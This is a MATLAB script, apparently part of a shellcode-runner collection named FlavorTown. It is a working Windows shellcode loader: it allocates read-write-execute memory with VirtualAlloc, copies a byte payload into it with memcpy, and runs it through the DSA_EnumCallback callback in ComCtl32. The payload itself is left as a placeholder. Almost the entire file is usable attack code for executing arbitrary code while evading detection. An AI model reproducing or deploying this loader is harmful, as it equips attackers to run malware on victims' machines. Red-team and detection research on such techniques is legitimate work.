% Wra7h/FlavorTown
% MATLAB version: R2023a
% Tested on Win10 x64

if not(libisloaded('kernel32'))
    loadlibrary('kernel32.dll', @kernel32proto);
end

if not(libisloaded('ComCtl32'))
    loadlibrary('ComCtl32.dll', @comctl32proto);
end

if not(libisloaded('msvcrt'))
    loadlibrary('msvcrt.dll', @msvcrtproto);
end

%payloadexample = uint8([86, 72, 137, 230,...]);
payload = uint8([PAYLOAD HERE]);
cbPayload = length(payload);

%VirtualAlloc
allocationType = bitxor(hex2dec('00001000'), hex2dec('00002000'));
protection = hex2dec('00000040');
hAlloc = calllib('kernel32', 'VirtualAlloc', [], cbPayload, allocationType, protection);

%Copy payload to RWX memory region
calllib('msvcrt', 'memcpy', hAlloc, payload, int64(cbPayload));

%Execute
hDSA = calllib('ComCtl32', 'DSA_Create', 1, 1);
calllib('ComCtl32', 'DSA_InsertItem', hDSA, 1, 0);
calllib('ComCtl32', 'DSA_EnumCallback', hDSA, hAlloc, []);

%Cleanup loaded libraries
if libisloaded('kernel32')
    unloadlibrary('kernel32');
end

if libisloaded('ComCtl32')
    unloadlibrary('ComCtl32');
end

if libisloaded('msvcrt')
    unloadlibrary('msvcrt');
end

function [fcns, structs, enuminfo] = kernel32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias=[];

    % Prototype for VirtualAlloc
    fcns.name{1} = 'VirtualAlloc';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int64'; 
    fcns.RHS{1} = {'int64Ptr', 'int64', 'uint32', 'uint32'};
end

function [fcns,structs,enuminfo] = comctl32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    
    % Prototype for DSA_Create
    fcns.name{1} = 'DSA_Create';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int64'; 
    fcns.RHS{1} = {'int', 'int'};
    
    % Prototype for DSA_InsertItem
    fcns.name{2} = 'DSA_InsertItem';
    fcns.calltype{2} = 'cdecl';
    fcns.LHS{2} = 'int'; 
    fcns.RHS{2} = {'int64', 'int', 'int64Ptr'};

    % Prototype for DSA_EnumCallback
    fcns.name{3} = 'DSA_EnumCallback';
    fcns.calltype{3} = 'cdecl';
    fcns.LHS{3} = 'voidPtr'; 
    fcns.RHS{3} = {'int64', 'int64', 'int64Ptr'};
    
end

function [fcns,structs,enuminfo] = msvcrtproto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    fcns.name{1} = 'memcpy';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr'; 
    fcns.RHS{1} = {'int64', 'uint8Ptr', 'int64'};
end